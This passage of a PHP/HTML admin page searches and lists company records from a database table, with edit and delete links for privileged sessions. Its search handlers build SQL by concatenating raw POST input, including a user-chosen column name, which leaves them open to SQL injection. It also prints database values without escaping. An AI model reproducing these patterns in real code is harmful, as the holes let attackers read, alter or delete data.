				              <option value="B">B</option>
				              <option value="C">C</option>
			                </select>
			              </label></td>
				          <td width="120" align="center"><label>
				            <input type="image" src="resources/bt_buscar.png" name="button9" id="button9" value="Enviar" />
				            </label></td>
			            </tr>
			          </table>
				      </form></td>
			      </tr>
				  </table>
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
				  <tr>
				    <td height="6"></td>
			      </tr>
				  </table>
                  -->
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
				  <tr>
				    <td height="24" align="center" bgcolor="#EEEEEE" class="texte_normal_blanco"><form id="form10" name="form5" method="post" action="index.php?menu=3&amp;sub=<?php echo $sub ?>&amp;search3" style="margin:0px">
				      <table width="660" border="0" cellspacing="0" cellpadding="0">
				        <tr>
				          <td width="88" height="26" class="texte_normal">&nbsp;Buscar por</td>
				          <td width="97" align="center" class="texte_normal">Familia</td>
				          <td width="140" align="left">
                          <!--<select name="campo1" class="texte_normal" id="campo1">
				            <option value="CFGM-CM">CFGM-CM</option>
				            <option value="CGM - EIE">CGM - EIE</option>
				            <option value="CGM- MECA">CGM- MECA</option>
				            <option value="CGM-CM">CGM-CM</option>
				            <option value="CGM-EI">CGM-EI</option>
				            <option value="CGM-EIE">CGM-EIE</option>
				            <option value="CGS-SRCA">CGS-SRCA</option>
				            <option value="CGM-ET">CGM-ET</option>
				            <option value="CGM-EV">CGM-EV</option>
				            <option value="CGM-FMM">CGM-FMM</option>
				            <option value="CGM-GCM">CGM-GCM</option>
				            <option value="CGM-MECA">CGM-MECA</option>
				            <option value="CGM-OET">CGM-OET</option>
				            <option value="CGM-SRCA">CGM-SRCA</option>
				            <option value="CGS- CI">CGS- CI</option>
				            <option value="CGS- SRCA">CGS- SRCA</option>
				            <option value="CGS-AUT">CGS-AUT</option>
				            <option value="CGS-CGM">CGS-CGM</option>
				            <option value="CGS-CI">CGS-CI</option>
				            <option value="CGS-DPM">CGS-DPM</option>
				            <option value="CGS-GCM">CGS-GCM</option>
				            <option value="CGS-PTHT">CGS-PTHT</option>
				            <option value="CGS-RL">CGS-RL</option>
				            <option value="CGS-SRCA">CGS-SRCA</option>
				            <option value="CM">CM</option>
				            <option value="FAM. GCM">FAM. GCM</option>
				            <option value="GCS-CI">GCS-CI</option>
				            <option value="PCP-OAFM">PCP-OAFM</option>
				            <option value="PCP-OAPT">PCP-OAPT</option>
				            <option value="PTHT">PTHT</option>
			              </select>-->
                          <?php $campo1 = $_POST['campo1']; ?>
                          <select name="campo1" class="texte_normal" id="campo1">
                          <?php
                      		$result = $db->Execute("SELECT DISTINCT familia FROM CDE_empresas_BACK2 ORDER BY familia ASC");
					 		 while (!$result->EOF) {
								//$id = $result->fields[0];
								$nombre = $result->fields[0];
							?>
                             <option value="<?php echo $nombre ?>" <?php if ($campo1==$nombre) { ?>selected="selected"<?php } ?>><?php echo $nombre ?></option>
                             <?php
									$result->MoveNext();
									}
							  ?>
                            <!--
                            <option value="CM" <?php if ($campo1=="CM") { ?>selected="selected"<?php } ?>>CM</option>
                            <option value="EIA" <?php if ($campo1=="EIA") { ?>selected="selected"<?php } ?>>EIA</option>
                            <option value="OET" <?php if ($campo1=="OET") { ?>selected="selected"<?php } ?>>OET</option>
                            <option value="EV" <?php if ($campo1=="EV") { ?>selected="selected"<?php } ?>>EV</option>
                            <option value="MECA" <?php if ($campo1=="MECA") { ?>selected="selected"<?php } ?>>MECA</option>
                            <option value="FMM" <?php if ($campo1=="FMM") { ?>selected="selected"<?php } ?>>FMM</option>
                            <option value="SRCA" <?php if ($campo1=="SRCA") { ?>selected="selected"<?php } ?>>SRCA</option>
                            <option value="AUT" <?php if ($campo1=="AUT") { ?>selected="selected"<?php } ?>>AUT</option>
                            <option value="CI" <?php if ($campo1=="CI") { ?>selected="selected"<?php } ?>>CI</option>
                            <option value="GCM" <?php if ($campo1=="GCM") { ?>selected="selected"<?php } ?>>GCM</option>
                            <option value="DPM" <?php if ($campo1=="DPM") { ?>selected="selected"<?php } ?>>DPM</option>
				            <option value="PTHT" <?php if ($campo1=="PTHT") { ?>selected="selected"<?php } ?>>PTHT</option>
				            <option value="RL" <?php if ($campo1=="RL") { ?>selected="selected"<?php } ?>>RL</option>
				            <option value="PCP-OAFM" <?php if ($campo1=="PCP-OAFM") { ?>selected="selected"<?php } ?>>PCP-OAFM</option>
				            <option value="PCP-OAPT" <?php if ($campo1=="PCP-OAPT") { ?>selected="selected"<?php } ?>>PCP-OAPT</option>
                            -->
			              </select>
                          </td>
				          <td width="95" align="center" class="texte_normal">Población</td>
				          <td width="120" align="left"><input name="campo2" type="text" class="texte_normal" id="campo2" size="16" /></td>
				          <td width="120" align="center"><label>
				            <input type="image" src="resources/bt_buscar.png" name="button10" id="button10" value="Enviar" />
				            </label></td>
			            </tr>
				        <tr>
				          <td height="10" class="texte_normal">&nbsp;</td>
				          <td colspan="5" align="left" class="texte_mini">*Deje el campo de poblacion en blanco para buscar solo por familias</td>
			            </tr>
			          </table>
				      </form></td>
			      </tr>
				  </table>
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
				  <tr>
				    <td height="6"></td>
			      </tr>
				  </table>
                <form id="form10" name="form5" method="post" action="index.php?menu=3&amp;sub=<?php echo $sub ?>&amp;search4" style="margin:0px">  
				<table width="660" border="0" align="center" cellpadding="0" cellspacing="0">
				  <tr>
				    <td width="85" height="26" bgcolor="#EEEEEE" class="texte_normal">&nbsp;Buscar por</td>
				    <td width="160" align="center" bgcolor="#EEEEEE" class="texte_normal">Nº de Concert</td>
				    <td width="280" align="left" bgcolor="#EEEEEE">
				      <input name="s_concert" type="text" class="texte_normal" id="s_concert" size="20" maxlength="4" />
				    </td>
				    <td width="115" align="center" bgcolor="#EEEEEE">
				      <input type="image" src="resources/bt_buscar.png" name="button6" id="button6" value="Enviar" />
				    </td>
			      </tr>
				  </table>
                </form>  
				<table width="640" border="0" align="center" cellpadding="0" cellspacing="0">
				  <tr>
				    <td height="6"></td>
			      </tr>
				  </table>
				<table width="660" border="0" align="center" cellpadding="0" cellspacing="0">
				<tr>
				<td height="24" bgcolor="#000000" class="texte_normal_blanco">&nbsp;Resultados de la Consulta</td>
				</tr>
				</table>
				<table width="660" border="0" align="center" cellpadding="0" cellspacing="0">
                  <tr>
                    <td height="20" bgcolor="#555555" class="texte_normal_blanco">
                    <table width="660" border="0" cellspacing="0" cellpadding="0">

                        <tr>
                          <td width="50" align="left" class="texte_mini_b">Familia</td>
                          <td width="150" align="left" class="texte_mini_b">Empresa</td>
                          <td width="90" align="left" class="texte_mini_b">Gerente</td>
                          <!--td width="110" align="left" class="texte_mini_b">Dirección</td-->
                          <td width="70" align="left" class="texte_mini_b">Poblacion</td>
                          <td width="70" align="left" class="texte_mini_b">Telf</td>
                          <td width="90" align="left" class="texte_mini_b">cif</td>
                          <td width="34" align="left" class="texte_mini_b">&nbsp;</td>
                          <td width="34">&nbsp;</td>
                          <td width="28">&nbsp;</td>
                        </tr>
            
            <div id="scroll">
				<?php //
				if (isset($_GET['search'])) {
				
					$campo = $_POST['campo'];
					$valor = $_POST['valor'];
				
					if ($campo=="familia") {
						
						$result = $db->Execute("SELECT * FROM CDE_empresas_BACK2 WHERE ".$campo." = '".$valor."' ORDER BY id DESC");
						
					} else {
					
						$result = $db->Execute("SELECT * FROM CDE_empresas_BACK2 WHERE ".$campo." LIKE '%".$valor."%' ORDER BY id DESC");
						
					}
				
				} elseif (isset($_GET['search2'])) { 
				
					$campo1 = $_POST['campo1'];
					$campo2 = $_POST['campo2'];
					
					$result = $db->Execute("SELECT * FROM CDE_empresas_BACK2 WHERE (familia LIKE '%".$campo1."%') AND (evaluacio LIKE '%".$campo2."%') ORDER BY id DESC");
				
				} elseif (isset($_GET['search3'])) { 
				
					$campo1 = $_POST['campo1'];
					$campo2 = $_POST['campo2'];
					
					$result = $db->Execute("SELECT * FROM CDE_empresas_BACK2 WHERE (familia = '$campo1') AND (ciutat LIKE '%".$campo2."%') ORDER BY id DESC");
					
				} elseif (isset($_GET['search4'])) {
					
					$concert = $_POST['s_concert'];

					$result = $db->Execute("SELECT * FROM CDE_empresas_BACK2 WHERE (concert = '$concert') ORDER BY id DESC");
					
				} else { 
				
					$result = $db->Execute("SELECT * FROM CDE_empresas_BACK2 ORDER BY empresa ASC");
							
				} 
				
				if ($result === false) die("failed");
                
				while (!$result->EOF) {
					
				for ($i=0, $max=$result->FieldCount(); $i < $max; $i++)
					
				$id = $result->fields[0];
				$nombre = $result->fields[1];
				$gerente = $result->fields[2];
				$direccion = $result->fields[3];
				$cp = $result->fields[4];
				$poblacion = $result->fields[5];
				$telf1 = $result->fields[7];
				$cif = $result->fields[9];
				$familia = $result->fields[11];

				?>
               
                  <tr bgcolor="#F7F7F7" class="texte_mini">
                    <td width="50" align="left" class="texte_mini"><?php echo utf8_encode($familia) ?></td>
                    <td width="150" align="left" class="texte_mini"><?php echo utf8_encode($nombre) ?></td>
                    <td width="90" align="left" class="texte_mini"><?php echo utf8_encode($gerente) ?></td>
                    <!--td width="110" align="left" class="texte_mini"><?php echo utf8_encode($cp." - ".$direccion) ?></td-->                    
                    <td width="70" align="left" class="texte_mini"><?php echo utf8_encode($poblacion) ?></td>
                    <td width="70" align="left" class="texte_mini"><?php echo utf8_encode($telf1) ?></td>
                    <td width="90" align="left" class="texte_mini"><?php echo utf8_encode($cif) ?></td>
                    <td width="34" align="left" class="texte_mini"><a href="javascript:Abrir_ventana('ficha_empresa.php?id=<?php echo $id ?>')" class="texte_mini">info</a></td>
                    <td width="34" align="left">
                    
                    <?php if ($_SESSION["autentificado"] <= 3) { ?>
                    <a href="index.php?menu=<?php echo $menu ?>&amp;sub=<?php echo $sub ?>&edit=<?php echo $id ?>"><img src="resources/ico_m_editar.png" width="16" height="16" border="0" /></a>
                    <?php } //?>                    
                    </td>

                    <td width="28" align="center">
                    <?php if ($_SESSION["autentificado"] == 1) { ?>
                              <a href="index.php?menu=<?php echo $menu ?>&amp;sub=<?php echo $sub ?>&borrar=<?php echo $id ?>&tabla=CDE_empresas_BACK2" onclick="return confirmar('Se borrara definitivamente')"><img src="resources/ico_m_del.png" width="16" height="16" border="0" /></a>
                    <?php } //?>                    
                    </td>
                    
                  </tr>

            <?php
            
				$result->MoveNext();
				} 
				?>
				</table></td>
				</tr>
				</table>
				
				</div></td>
				</tr>
				</table> 
				<?php
				   }  } 
				?>

</body>
</html>
